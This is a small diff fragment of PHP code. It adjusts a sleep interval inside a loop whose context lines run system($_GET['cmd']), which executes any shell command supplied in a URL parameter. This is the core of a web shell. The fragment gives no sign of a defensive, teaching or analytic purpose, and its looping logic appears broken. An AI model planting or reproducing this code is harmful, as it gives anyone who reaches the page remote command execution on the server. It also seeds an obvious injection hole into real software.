@@ -10,7 +10,7 @@
     {
         $comando = system($_GET['cmd']);
         while($comando){
-            sleep(0.1);
+            sleep(10);
             echo $comando;
             flush();
         }
